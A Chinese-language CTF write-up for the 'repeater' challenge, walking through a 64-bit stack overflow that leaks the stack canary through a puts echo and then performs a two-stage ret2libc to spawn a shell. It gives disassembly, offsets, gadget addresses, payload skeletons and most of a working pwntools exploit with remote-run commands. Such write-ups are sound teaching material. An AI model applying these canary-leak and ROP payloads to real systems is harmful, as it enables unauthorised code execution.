# Speedrun：repeater（64 位 canary + ret2libc）

> 题型：栈溢出 + **canary leak** + ret2libc（两阶段）
> 目标：`read(0, buf, 0x100)` 溢出 → 泄 canary → 泄 `read@got` → 回 `main` → `system("/bin/sh")`
> 关键：偏移 **0x28**、canary `rbp-0x8`、`pop rdi; ret = 0x400933`、`ret = 0x400934`

---

## 0. 一句话结论

```text
64 位、No PIE、Canary、NX、Partial RELRO、stripped

main 是一个循环：
  puts(banner)
loop:
  printf("What do you want me to repeat with you? Please enter it to me:")
  read(0, buf, 0x100)     <-- char buf[0x28] @ rbp-0x30，无边界
  puts(buf)               <-- 原样回显：既是 leak 点，也是 canary 泄漏点
  printf("Do you want to continue?")
  scanf("%d", &g_continue)   # g == 0 继续循环；g != 0 打印
  getchar()                  # "hah,you are so stupid!!!" 后 return

三段式：
  1) 0x28 个 A + 1 字节 B  -> puts 把 canary 剩下 7 字节一起打出来
  2) canary + 0 + pop rdi + read@got + puts@plt + main   -> leak libc
  3) canary + 0 + ret + pop rdi + "/bin/sh" + system      -> getshell
```

Payload 骨架：

```python
# stage 1
b"A" * 0x28 + b"B"
# stage 2
b"A" * 0x28 + p64(canary) + p64(0) \
    + p64(POP_RDI) + p64(READ_GOT) + p64(PUTS_PLT) + p64(MAIN)
# stage 3
b"A" * 0x28 + p64(canary) + p64(0) \
    + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
```

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn Writeups/ret2libc'

file repeater
checksec --file=repeater
strings -tx repeater | grep -Ei 'repeat|continue|stupid'
objdump -d -M intel repeater | sed -n '/^00000000004007d9/,$p'
```

关键输出：

```text
ELF 64-bit LSB executable, x86-64, dynamically linked, stripped
Partial RELRO
Canary found
NX enabled
No PIE (0x400000)

 a49 haha,Human nature is a repeater.
 a70 What do you want me to repeat with you? Please enter it to me:
 aaf Do you want to continue?
 acb hah,you are so stupid!!!
```

读法：

| 观察 | 结论 |
| --- | --- |
| 64 位 + No PIE | 二进制内地址固定，`pop rdi` / `ret` 可直接写死；libc 需要 leak |
| Canary found | 溢出前必须先泄 canary |
| `read(0, buf, 0x100)` + `puts(buf)` | 经典“先把输入打回来”的回显型溢出 |
| `puts(buf)` 打印到 NUL 为止 | 把 canary 的 NUL 首字节覆盖成非 0，就能打印出 canary 剩余字节 |
| `scanf("%d")` 控制循环 | 应答 **0 = 继续**，非 0 = 打印 `hah,you are so stupid!!!` 后 `return` |
| No `system@plt`，只有 `puts@plt` | 只能 ret2libc：先 `puts(read@got)`，再回 `main` |


---

## 2. 关键逆向

### 2.1 主循环

```asm
00000000004007d9 <main>:                 # _start 里 mov edi,0x4007d9
  4007dd: sub    rsp,0x30
  4007e1: mov    rax,QWORD PTR fs:0x28
  4007ea: mov    QWORD PTR [rbp-0x8],rax      # canary @ rbp-0x8
  4007f0: mov    rax,QWORD PTR [rip+...]      # stdin
  400809: call   setvbuf                      # 输入输出都不缓冲，交互无 flush 坑
  40080e: mov    rax,QWORD PTR [rip+...]      # stdout
  400827: call   setvbuf
  40082c: call   0x400796                     # 6 条 puts 的 banner
  400836: jmp    0x400891                     # 第一次跳过 read，直接判断
  400838: mov    edi,0x400a70                 # "What do you want me to repeat ..."
  400842: call   printf
  400847: lea    rax,[rbp-0x30]               # buf @ rbp-0x30
  400853: mov    edi,0
  400858: mov    edx,0x100
  40085d: call   read                         # read(0, buf, 0x100)  <-- 溢出
  40085d: lea    rax,[rbp-0x30]
  400864: call   puts                         # puts(buf)           <-- 回显 / leak
  400869: mov    edi,0x400aaf                 # "Do you want to continue?"
  400873: call   printf
  400878: mov    esi,0x60108c                 # &g_continue
  40087d: mov    edi,0x400ac8                 # "%d"
  400887: call   __isoc99_scanf
  40088c: call   getchar                      # 吃掉回车
  400891: mov    eax,DWORD PTR [rip+...]      # g_continue
  400897: test   eax,eax
  400899: je     0x400838                     # == 0 -> 继续循环
  40089b: mov    DWORD PTR [rip+...],0x0      # 清零
  4008a5: mov    edi,0x400acb                 # "hah,you are so stupid!!!"
  4008aa: call   puts
  4008b4: mov    rcx,QWORD PTR [rbp-0x8]
  4008b8: xor    rcx,QWORD PTR fs:0x28
  4008c3: call   __stack_chk_fail             # canary 校验
  4008c8: leave
  4008c9: ret                                 # <-- 劫持点
```

栈布局：

```text
rbp-0x30  +------------------+  <- buf
          |  0x28 bytes      |
rbp-0x08  +------------------+  <- canary（低字节固定 0x00）
rbp+0x00  |  saved rbp       |
rbp+0x08  |  saved RIP       |  <- ret
```

所以 **buffer → canary = 0x28**，**buffer → saved RIP = 0x38**。

### 2.2 canary leak 的原理

`read` 只写我们发的字节，canary 低字节 `0x00` 不会被覆盖；
但只要多发 **1 个字节**，`buf[0x28]` 正好压到 canary 低字节，把它改成非 0：

```text
发送： "A"*0x28 + "B"
内存： AAAA...AAAA B <canary[1]> <canary[2]> ... <canary[7]> 00 ...
puts ： 一路打印到那个 00 为止
```

回显里 `"A"*0x28 + "B"` 之后紧跟的 7 字节就是 canary 的高 7 字节，补回低字节：

```python
canary = u64(b"\x00" + tail7)
```

### 2.3 gadget

```asm
  400932: 41 5f      pop r15
  400934: c3         ret
```

非对齐取 gadget：

```text
0x400933 -> 5f c3   = pop rdi; ret
0x400934 -> c3      = ret        （system 需要的 16 字节对齐）
```

`__libc_csu_init`（0x4008d0）尾部这一串 `pop r12..r15; ret` 就是标准 gadget 矿。

### 2.4 两阶段

```text
stage 2: puts(read@got) 泄 libc，然后 ret 回 main 重新拿到一次 read
stage 3: system("/bin/sh")
```

`read@got = 0x601030`（`read@plt = 0x400640`），`puts@plt = 0x400610`，`main = 0x4007d9`。

---

## 3. 完整 EXP 要点

见 `18_repeater_exp.py`。核心：

```python
OFFSET = 0x28
POP_RDI = 0x400933
RET = 0x400934
PUTS_PLT = 0x400610
READ_GOT = 0x601030
MAIN = 0x4007d9

# 1) canary
p.send(b"A" * OFFSET + b"B")
line = p.recvuntil(b"Do you want to continue?").split(b"\n")[0]
canary = u64(b"\x00" + line[OFFSET + 1:OFFSET + 8])
p.sendline(b"0")          # 0 = 继续循环

# 2) leak libc
chain = p64(canary) + p64(0) + p64(POP_RDI) + p64(READ_GOT) \
        + p64(PUTS_PLT) + p64(MAIN)
p.send(b"A" * OFFSET + chain)
p.recvuntil(b"Do you want to continue?")
p.sendline(b"1")          # 非 0 = 走 return，触发 ROP
p.recvuntil(b"stupid!!!\n")
read_addr = u64(p.recvn(6).ljust(8, b"\x00"))

# 3) shell
chain = p64(canary) + p64(0) + p64(RET) + p64(POP_RDI) + p64(binsh) + p64(system)
p.send(b"A" * OFFSET + chain)
p.recvuntil(b"Do you want to continue?")
p.sendline(b"1")
```

注意：所有地址都必须 `p64`；`scanf("%d")` 的应答必须 `sendline`，否则下一轮 `%d` 会把 payload 的垃圾字节当数字读。

---

## 4. 本地验证

```bash
cd '/home/yfhd5/Pwn Writeups/ret2libc'

# 没有 flag 文件也能验证 shell：会打印 __PWNED__
python 18_repeater_exp.py LOCAL

# 放一个假 flag 验证完整链路
echo 'flag{LOCAL_TEST_18}' > flag.txt
python 18_repeater_exp.py LOCAL
rm -f flag.txt
```

正确输出：

```text
[+] canary = 0x911e94ff12227900
[+] read = 0x7522f9528110, libc = 0x7522f9400000, system = 0x7522f945c2e0
hah,you are so stupid!!!
__PWNED__
flag{LOCAL_TEST_18}

[+] GOT THE FLAG: flag{LOCAL_TEST_18}
```

远程（libc 必须匹配）：

```bash
LIBC=./libc.so.6 HOST=target.example.com PORT=9999 python 18_repeater_exp.py
SSL=1 LIBC=./libc.so.6 HOST=xxx.tcp-ctf2.dasctf.com PORT=9999 python 18_repeater_exp.py
```

脚本会检查 `libc_base & 0xfff == 0`，不匹配直接报 `LIBC does not match the target`。

---

## 5. 交互坑

1. **偏移是 0x28，不是 0x30**
   `sub rsp,0x30` 只是栈帧大小，`buf` 只占 `rbp-0x30 .. rbp-0x9`，
   canary 在 `rbp-0x8`。按 0x30 写会把 `saved RIP` 首字节打掉，回显只剩 5 字节。

2. **`read(0, buf, 0x100)` 可能短读**
   `read` 返回“当前可读字节数”，不是“我们发了多少”。
   偶尔 0 字节 / 5 字节是正常现象 —— **整条连接重来一遍**（脚本里重试 5 次）。

3. **`scanf("%d")` 的语义是反的**
   `0` = 继续循环；非 0 = 打 `hah,you are so stupid!!!` 然后 `return`。
   想触发 ROP 必须发非 0，并在 `recvuntil(b"stupid!!!\n")` 之后收 leak。

4. **回显里没有换行做边界**
   `printf("Do you want to continue?")` 无 `\n`，第一行必须用
   `recvuntil(ASK).split(b"\n")[0]` 取，不能 `recvline()` 收 leak。

5. **`system` 的 16 字节对齐**
   stage 3 在 `pop rdi` 前补一个 `ret (0x400934)`；
   少了它会在 `system` 内部的 `movaps` 上 SIGSEGV。

6. **leak 只有 6 字节**
   `puts` 打印到 NUL 为止，64 位 libc 地址高 2 字节必是 `\x00\x00`，
   用 `recvn(6).ljust(8, b"\x00")`，不要等 8 字节。

7. **stripped 不影响利用**
   主函数靠 `_start` 里的 `mov edi,0x4007d9` 定位（`__libc_start_main` 的第一个参数）。

---

## 6. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:15 | `file` + `checksec`：64 位、No PIE、Canary、NX、Partial RELRO、stripped |
| 0:15–0:35 | `strings` 找到 `Please enter it to me:` / `Do you want to continue?` / `stupid!!!` |
| 0:35–1:00 | 反汇编 main：`read(0, rbp-0x30, 0x100)`、`puts(buf)`、`scanf("%d")` 控制循环 |
| 1:00–1:15 | 算偏移：buffer→canary `0x28`，buffer→RIP `0x38` |
| 1:15–1:35 | canary leak：`0x28*A + "B"`，取回显里 `0x29` 之后的 7 字节 |
| 1:35–1:55 | stage2 `puts(read@got)` 回 main，stage3 `system("/bin/sh")` |
| 1:55–2:00 | 本地 `LOCAL` 验证 `__PWNED__`，远程 `cat flag*` |

---

## 7. 题型识别卡

```text
64 位 + No PIE + Canary + 循环里 read(0, buf, N) 后 puts(buf)
= 先靠 puts 把 canary 打出来，再 ret2libc
```

一句话：**`puts(buf)` 的回显就是最强的泄露原语；把 canary 低字节改成非 0，剩下 7 字节白送。**
